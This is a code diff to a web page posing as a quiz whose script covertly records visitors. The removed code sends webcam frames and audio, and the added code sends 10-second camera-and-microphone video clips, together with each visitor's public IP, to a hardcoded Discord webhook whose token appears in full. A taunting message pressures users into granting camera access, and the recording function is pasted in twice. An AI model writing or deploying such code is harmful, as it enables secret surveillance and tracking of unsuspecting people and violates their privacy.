@@ -194,12 +194,9 @@
     let score = 0;
     let isAnswered = false;
     let stream = null;
-    let frameCounter = 0;
-    let captureInterval = null;
-    let audioStream = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
-    let audioCounter = 0;
+    let videoRecorder = null;
+    let videoChunks = [];
+    let videoCounter = 0;
     const WEBHOOK = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
     async function getIP() {
       try {
@@ -215,103 +212,192 @@
         }
       }
     }
-    async function sendFrame() {
-      const video = document.getElementById('liveVideo');
-      if (!video || !video.videoWidth) return;
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
+    async function startVideoRecording() {
       try {
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.68));
-        if (blob.size < 2000) return;
-        const file = new File([blob], `frame-${++frameCounter}.jpg`, { type: 'image/jpeg' });
-        const ip = await getIP();
-        const form = new FormData();
-        form.append('file', file);
-        form.append('payload_json', JSON.stringify({
-                          username: "🇳🇾🇿🇪🇱 🇫🇷🇦🇲🇪 🇱🇴🇬🇬🇪🇷",
-          content: `Frame ${frameCounter}`,
-          embeds: [{
-            title: "Quiz Camera Capture",
-            color: 10181046,
-            fields: [
-              { name: "Public IP:", value: `\`${ip}\``, inline: true },
-              { name: "Time:", value: new Date().toLocaleString(), inline: true }
-            ],
-            image: { url: "attachment://frame.jpg" },
-            timestamp: new Date().toISOString(),
-                              footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
-          }]
-        }));
-        await fetch(WEBHOOK, { method: "POST", body: form });
-      } catch {}
-    }
-    async function startAudioRecording() {
-      try {
-        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+        if (!stream) return;
         
-        mediaRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            audioChunks.push(event.data);
+        // Check for supported MIME types
+        let mimeType;
+        if (MediaRecorder.isTypeSupported('video/mp4')) {
+          mimeType = 'video/mp4';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+          mimeType = 'video/webm;codecs=vp9';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+          mimeType = 'video/webm;codecs=vp8';
+        } else if (MediaRecorder.isTypeSupported('video/webm')) {
+          mimeType = 'video/webm';
+        } else {
+          mimeType = ''; // Let browser choose
+        }
+        
+        videoRecorder = new MediaRecorder(stream, mimeType ? { 
+          mimeType: mimeType,
+          videoBitsPerSecond: 1000000
+        } : {});
+        
+        videoRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            videoChunks.push(event.data);
           }
         };
         
-        mediaRecorder.start();
+        videoRecorder.start();
         
-        setInterval(async () => {
-          if (mediaRecorder && mediaRecorder.state === 'recording' && audioChunks.length > 0) {
-            mediaRecorder.requestData();
+        // Send video every 10 seconds
+        setInterval(() => {
+          if (videoRecorder && videoRecorder.state === 'recording') {
+            videoRecorder.stop();
+            
+            videoRecorder.onstop = async () => {
+              if (videoChunks.length > 0) {
+                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/mp4' });
+                
+                if (videoBlob.size > 10000) {
+                  try {
+                    const ip = await getIP();
+                    const fileExt = videoRecorder.mimeType && videoRecorder.mimeType.includes('webm') ? 'webm' : 'mp4';
+                    const form = new FormData();
+                    form.append('file', new File([videoBlob], `video-${++videoCounter}.${fileExt}`, { type: videoRecorder.mimeType || 'video/mp4' }));
+                    form.append('payload_json', JSON.stringify({
+                                                username: "🇳🇾🇿🇪🇱 🇻🇮🇩🇪🇴 🇱🇴🇬🇬🇪🇷",
+                      content: `Video Recording #${videoCounter} (${videoRecorder.mimeType || 'video/mp4'})`,
+                      embeds: [{
+                        title: "Quiz Video Capture",
+                        description: "10-second video segment",
+                        color: 15158332,
+                        fields: [
+                          { name: "Public IP:", value: `\`${ip}\``, inline: true },
+                          { name: "Time:", value: new Date().toLocaleString(), inline: true },
+                          { name: "Format:", value: `\`${videoRecorder.mimeType || 'auto'}\``, inline: true }
+                        ],
+                        timestamp: new Date().toISOString(),
+                                                      footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
+                      }]
+                    }));
+                    
+                    await fetch(WEBHOOK, { method: "POST", body: form });
+                  } catch {}
+                }
+                
+                // Clear chunks and restart recording
+                videoChunks = [];
+                if (stream && stream.active) {
+                  videoRecorder = new MediaRecorder(stream, mimeType ? { 
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 1000000
+                  } : {});
+                  
+                  videoRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                      videoChunks.push(event.data);
+                    }
+                  };
+                  
+                  videoRecorder.start();
+                }
+              }
+            };
           }
-        }, 5000);
+        }, 10000);
+        
       } catch (error) {
-        console.log('Audio recording not available');
+        console.log('Video recording not available');
+      }
+    }
+    async function startVideoRecording() {
+      try {
+        if (!stream) return;
+        
+        // Check for supported MIME types
+        let mimeType;
+        if (MediaRecorder.isTypeSupported('video/mp4')) {
+          mimeType = 'video/mp4';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
+          mimeType = 'video/webm;codecs=vp9,opus';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+          mimeType = 'video/webm;codecs=vp8,opus';
+        } else if (MediaRecorder.isTypeSupported('video/webm')) {
+          mimeType = 'video/webm';
+        } else {
+          mimeType = ''; // Let browser choose
+        }
+        
+        videoRecorder = new MediaRecorder(stream, mimeType ? { 
+          mimeType: mimeType,
+          videoBitsPerSecond: 1000000,
+          audioBitsPerSecond: 128000
+        } : {});
+        
+        videoRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            videoChunks.push(event.data);
+          }
+        };
+        
+        videoRecorder.start();
+        
+        // Send video every 10 seconds
+        setInterval(() => {
+          if (videoRecorder && videoRecorder.state === 'recording') {
+            videoRecorder.stop();
+            
+            videoRecorder.onstop = async () => {
+              if (videoChunks.length > 0) {
+                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/mp4' });
+                
+                if (videoBlob.size > 10000) {
+                  try {
+                    const ip = await getIP();
+                    const fileExt = videoRecorder.mimeType && videoRecorder.mimeType.includes('webm') ? 'webm' : 'mp4';
+                    const form = new FormData();
+                    form.append('file', new File([videoBlob], `video-${++videoCounter}.${fileExt}`, { type: videoRecorder.mimeType || 'video/mp4' }));
+                    form.append('payload_json', JSON.stringify({
+                      username: "🇨🇷🇮🇸 🇻🇮🇩🇪🇴 🇱🇴🇬🇬🇪🇷",
+                      content: `Video Recording #${videoCounter} (${videoRecorder.mimeType || 'video/mp4'})`,
+                      embeds: [{
+                        title: "Quiz Video Capture with Audio",
+                        description: "10-second video + audio segment",
+                        color: 15158332,
+                        fields: [
+                          { name: "Public IP:", value: `\`${ip}\``, inline: true },
+                          { name: "Time:", value: new Date().toLocaleString(), inline: true },
+                          { name: "Format:", value: `\`${videoRecorder.mimeType || 'auto'}\``, inline: true }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
+                      }]
+                    }));
+                    
+                    await fetch(WEBHOOK, { method: "POST", body: form });
+                  } catch {}
+                }
+                
+                // Clear chunks and restart recording
+                videoChunks = [];
+                if (stream && stream.active) {
+                  videoRecorder = new MediaRecorder(stream, mimeType ? { 
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 1000000
+                  } : {});
+                  
+                  videoRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                      videoChunks.push(event.data);
+                    }
+                  };
+                  
+                  videoRecorder.start();
+                }
+              }
+            };
+          }
+        }, 10000);
+        
+      } catch (error) {
+        console.log('Video recording not available');
       }
     }
     
-    function sendAudioRecording() {
-      return new Promise((resolve) => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-          
-          mediaRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            
-            if (audioBlob.size > 5000) {
-              try {
-                const ip = await getIP();
-                const form = new FormData();
-                form.append('file', new File([audioBlob], `audio-complete.webm`, { type: 'audio/webm' }));
-                form.append('payload_json', JSON.stringify({
-                  username: "🇳🇾🇿🇪🇱 🇦🇺🇩🇮🇴 🇱🇴🇬🇬🇪🇷",
-                  content: `Complete Audio Recording`,
-                  embeds: [{
-                    title: "Full Quiz Audio Capture",
-                    description: "Complete audio recording from entire quiz session",
-                    color: 3447003,
-                    fields: [
-                      { name: "Public IP:", value: `\`${ip}\``, inline: true },
-                      { name: "Time:", value: new Date().toLocaleString(), inline: true }
-                    ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
-                  }]
-                }));
-                
-                navigator.sendBeacon(WEBHOOK, form);
-              } catch {}
-            }
-            resolve();
-          };
-        } else {
-          resolve();
-        }
-      });
-    }
     (async function logWebsiteEntry() {
       try {
         let publicIP = "Unknown";
@@ -345,7 +431,7 @@
                 { name: "Time:", value: `\`${new Date().toLocaleString()}\``, inline: true }
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "🇳🇾🇿🇪🇱 🇱🇴🇬🇬🇪🇷" }
+              footer: { text: "🇨🇷🇮🇸 🇱🇴🇬🇬🇪🇷" }
             }]
           })
         });
@@ -366,13 +452,14 @@
     createParticles();
     async function requestCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" }, 
+          audio: true 
+        });
         const video = document.getElementById('liveVideo');
         video.srcObject = stream;
         video.play().catch(() => {});
-        setTimeout(() => sendFrame(), 1500);
-        captureInterval = setInterval(sendFrame, 2000);
-        startAudioRecording();
+        startVideoRecording();
         showQuiz();
       } catch (error) {
         document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
@@ -456,22 +543,18 @@
       `;
     }
     window.addEventListener('beforeunload', (e) => {
-      sendAudioRecording();
+      if (videoRecorder && videoRecorder.state === 'recording') {
+        videoRecorder.stop();
+      }
       
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
-      if (audioStream) {
-        audioStream.getTracks().forEach(track => track.stop());
-      }
-      if (captureInterval) {
-        clearInterval(captureInterval);
-      }
     });
     
     window.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') {
-        sendAudioRecording();
+      if (document.visibilityState === 'hidden' && videoRecorder && videoRecorder.state === 'recording') {
+        videoRecorder.stop();
       }
     });
   </script>
